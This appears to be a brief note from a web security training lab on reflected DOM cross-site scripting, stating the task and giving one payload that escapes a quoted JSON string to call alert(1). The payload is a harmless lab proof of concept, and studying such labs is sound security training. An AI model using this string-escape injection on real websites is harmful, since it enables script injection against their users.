# Lab: Reflected DOM XSS

Task : create an injection that calls the alert() function.
analysis: aaaaa\"};alert(1);//